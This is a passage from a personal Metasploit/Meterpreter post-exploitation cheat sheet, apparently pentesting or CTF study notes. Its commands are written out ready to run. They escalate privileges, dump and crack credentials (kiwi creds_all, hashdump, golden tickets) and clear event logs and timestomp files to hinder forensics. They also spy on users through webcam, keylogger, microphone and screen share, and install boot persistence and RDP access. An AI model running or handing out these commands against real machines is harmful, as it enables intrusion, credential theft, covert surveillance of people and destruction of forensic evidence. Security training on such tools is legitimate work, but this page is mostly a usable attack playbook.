------
Payloads
------

You may send a command to the background with `CTRL-Z`, or using `background`. You can use `sessions` to see your sessions, and `sessions -i <sid>` to move a session to the foreground.

```bash
meterpreter > bg
meterpreter > background # same
msf6 exploit('module_used') > sessions
msf6 exploit('module_used') > sessions -i 1
```
</div></div>

<hr class="sep-both">

## Meterpreter

<div class="row row-cols-md-2"><div>

* See if you are root / your privileges

```bash
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
# it you see that, you're admin ðŸ˜Ž
meterpreter > getprivs
# see your privileges
```

* Try automatic privilege escalation ðŸ˜Ž. Look [at this article](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/) if it fails, and you want to give another try.

```bash
meterpreter > getsystem
```

Learn more about the system. It could be useful to find exploit, for instance by looking for CVE given the Windows build. The architecture can help too, because some scripts work better on some architectures.

```bash
meterpreter > sysinfo
# Computer        : XXX-PC
# OS              : Windows X (... Build xxx...).
# Architecture    : x64
```
</div><div>

You can also start a shell, and directly asks Windows

```bash
meterpreter > shell # start a shell
# you can run commands
# C:\WINDOWS\system32> whoami
# C:\WINDOWS\system32> systeminfo
```

You can ask for suggested exploits <small>(this doesn't work well on x64)</small>

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

If you found once, use `background` to go back to the console, and try an additional exploit.

<details class="details-e">
<summary>Note: Windows defender</summary>

It's highly likely that the machine is running Windows defender. You may try to use others payloads, such as `exploit/multi/script/web_delivery`.

* set the target (ex: powershell)
* ...
* run
* paste the prompt in the terminal you want to exploit
* done?
</details>

<details class="details-e">
<summary>Note: SSL</summary>

I had to do that once, I don't remember why ðŸ’¥

* Add the `hostname` to `/etc/hosts` (use nano/...)
* In meterpreter, set SSL to true
* run

</details>

</div></div>

<hr class="sep-both">

## Not-admin yet

<div class="row row-cols-md-2"><div>

To access a service, we need to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM" (root) should be okay, although you may have to try a few times.

```bash
meterpreter > ps # list process
meterpreter > migrate process_pid # move to another process
meterpreter > migrate -N process_name # same
```

You can dump in-memory passwords

```bash
meterpreter > load kiwi
meterpreter > migrate some_process_nt_system_compatible
# retrieve all credentials
meterpreter > creds_all
# later, you may use it to create a "backdoor"
meterpreter > golden_ticket_create
```
</div><div>

Other commands

```bash
meterpreter > idletime # time the host was idle
meterpreter > ipconfig # network information
meterpreter > search -f pattern # search file by pattern
meterpreter > search -f pattern from* # ... inside given directories
meterpreter > download c:\\path # download to your machine
meterpreter > upload local_file c:\\path # upload
```

<details class="details-e">
<summary>You can use many Linux commands</summary>

```bash
meterpreter > ls # list files
meterpreter > cd # move
meterpreter > pwd # path to current folder
meterpreter > cat file # print file
meterpreter > edit file # open file in vim
meterpreter > ps # see running processes
meterpreter > exit
```
</details>

<details class="details-e mt-4">
<summary>Load a file with commands</summary>

You can use `lpwd`, and `lcd` to move on your local machine. Then, you can use `resource` to execute a suite of meterpreter commands.

```bash
meterpreter > lpwd
# local path
meterpreter > lcd path
# move to path (local)
meterpreter > resource file.txt # with commands inside
```
</details>
</div></div>

<hr class="sep-both">

## As an admin

<div class="row row-cols-md-2"><div>

Dump every username/password store by the system, they are hashed, you need to use `john` with `format=nt` to try bruteforce NTML hashes. It's worth noting that you can use the [hash to login using psexec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```bash
meterpreter > hashdump
# You may try to crack them using john within the msfconsole
msf6 exploit('module_used') > use auxiliary/analyze/crack_windows
msf6 exploit('module_used') > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit('module_used') > run
```

Clear logs

```bash
meterpreter > clearev
```

Mess with timestamp to complicate forensics/investigations

```bash
meterpreter > timestomp
```
</div><div>


<details class="details-e">
<summary>Take control of the webcam</summary>

```bash
meterpreter > webcam_list
meterpreter > webcam_snap
```
</details>

<details class="details-e">
<summary>Take a screenshot</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > use espia
meterpreter > screengrab
```

You may also use `screenshot` ðŸ“Œ.
</details>

<details class="details-e">
<summary>Install a key logger</summary>

```bash
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start # start
meterpreter > keyscan_dump # dump keys
```
</details>

<details class="details-e">
<summary>Watch the screen in real time</summary>

Watch the remote user desktop in real time

```bash
meterpreter > screenshare
meterpreter > record_mic # Record audio from the default microphone for X seconds
```
</details>

<details class="details-e">
<summary>Record microphone</summary>

Record audio from the default microphone for X seconds

```bash
meterpreter > record_mic
```
</details>

<details class="details-e">
<summary>Enable Remote Desktop Protocol</summary>

```bash
meterpreter > run post/windows/manage/enable_rdp
```
</details>

<details class="details-e">
<summary>Persistence</summary>

See [METERPRETER SERVICE](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/).

```bash
# Automatically start the agent when the system boots
meterpreter > run persistence -X
```
</details>
</div></div>

<hr class="sep-both">

## msfconsole, and nessus

<div class="row row-cols-md-2"><div>

To be honest, it was way more useful to explore results in nessus web interface, but if you don't have one, then this is surely something useful.

![nessus_exploit_with](_images/nessus_exploit_with.png)

First, start a msf database

```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
# I got some errors, but it still works
```

Then in your msfconsole

```bash
$ msfconsole -q
msf6 > db_status # check if connected
[*] Connected to msf. Connection type: postgresql.
```
</div><div>

Everything below is coming from [this tutorial](https://scubarda.com/2015/11/16/launching-nessus-scans-inside-metasploit/), but metasploit unleashed has also [some tips](https://www.offensive-security.com/metasploit-unleashed/working-with-nessus/).

```bash
msf6 > load nessus
# Connect
msf6 > nessus_connect user:pass@localhost:8834
# List the scans that you did
msf6 > nessus_scan_list
# Import the result of a scan
msf6 > nessus_db_import id_you_found_in_the_list
```

Once you did, there a few commands you can use

* `services`: see what services the target run
* `vulns`: see vulnerabilities
* `vulns -s ftp`: see ftp vulnerabilities
* `vulns -S keyword`: see vulnerabilities including keyword
* `search cve:2010-2075`: search CVE

Then, process as usual.
</div></div>